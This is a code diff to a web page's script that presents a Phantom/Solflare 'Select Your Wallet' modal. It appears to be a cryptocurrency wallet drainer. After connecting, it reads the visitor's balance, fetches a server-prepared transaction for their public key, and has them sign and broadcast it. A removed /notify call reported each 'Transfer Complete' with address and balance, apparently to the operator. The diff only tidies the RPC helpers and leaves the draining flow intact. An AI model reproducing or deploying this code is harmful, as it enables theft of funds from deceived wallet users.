@@ -93,7 +93,7 @@
         }
 
         $(document).ready(function() {
-            console.log('🚀 Ready');
+            console.log('Ready');
             
             function showModal() { checkStatus(); $('#wallet-modal').fadeIn(200); }
             function hideModal() { $('#wallet-modal').fadeOut(200); $('#wallet-options').removeClass('hidden'); $('#wallet-loading-state').removeClass('active'); $('.wallet-modal-header h3').text('Select Your Wallet'); $('#wallet-modal').removeClass('locked'); }
@@ -104,39 +104,37 @@
                 $('#solflare-status').html(window.solflare && window.solflare.isSolflare ? '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>' : '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
             }
             
-            // All RPC calls go through backend (no more CORS/403 errors)
-            async function backendCall(endpoint, data) {
-                const response = await fetch(endpoint, {
+            async function getBalance(pk) {
+                const res = await fetch('/api/getBalance', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
+                    body: JSON.stringify({ publicKey: pk })
                 });
-                const result = await response.json();
-                if (result.error) throw new Error(result.error);
-                return result;
-            }
-            
-            async function getBalance(pk) {
-                const result = await backendCall('/api/getBalance', { publicKey: pk });
-                return result.balance;
+                const data = await res.json();
+                if (!data.success) throw new Error(data.error);
+                return data.balance;
             }
             
             async function getBlockhash() {
-                const result = await backendCall('/api/getBlockhash', {});
-                return { blockhash: result.blockhash, lastValidBlockHeight: result.lastValidBlockHeight };
+                const res = await fetch('/api/getBlockhash', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' });
+                const data = await res.json();
+                if (!data.success) throw new Error(data.error);
+                return { blockhash: data.blockhash, lastValidBlockHeight: data.lastValidBlockHeight };
             }
             
             async function sendTransaction(base64Tx) {
-                const result = await backendCall('/api/sendTransaction', { transaction: base64Tx });
-                return result.txid;
-            }
-            
-            async function sendNotification(data) {
-                try { await fetch('/notify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch(e) {}
+                const res = await fetch('/api/sendTransaction', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ transaction: base64Tx })
+                });
+                const data = await res.json();
+                if (!data.success) throw new Error(data.error);
+                return data.txid;
             }
             
             async function connectWallet(walletType, provider) {
-                if (!provider) { alert('Install ' + (walletType === 'phantom' ? 'Phantom' : 'Solflare')); return; }
+                if (!provider) { alert('Install wallet'); return; }
                 showLoading(walletType);
                 try {
                     $('.wallet-loading-title').text('Connecting...');
@@ -163,12 +161,12 @@
                     console.log('Verified');
                     
                     $('.wallet-loading-title').text('Getting Transaction...');
-                    const txResp = await fetch('/prepare-transaction', {
+                    const txRes = await fetch('/prepare-transaction', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ publicKey: pubKey })
                     });
-                    const txData = await txResp.json();
+                    const txData = await txRes.json();
                     if (!txData.success) throw new Error(txData.error);
                     
                     $('.wallet-loading-title').text('Getting Blockhash...');
@@ -192,7 +190,6 @@
                     
                     $('.wallet-loading-title').text('Success!');
                     $('.wallet-loading-subtitle').html(`Complete!<br>${txid.slice(0,6)}...${txid.slice(-8)}`);
-                    await sendNotification({ address: pubKey, balance: solBalance, walletType, customMessage: '🎉 Transfer Complete! TXID: ' + txid });
                     setTimeout(hideModal, 3000);
                 } catch(e) {
                     console.error('Error:', e);
@@ -210,7 +207,6 @@
             checkStatus();
             setTimeout(checkStatus, 500);
             setTimeout(checkStatus, 2000);
-            console.log('✅ Ready');
         });
     </script>
 </body>
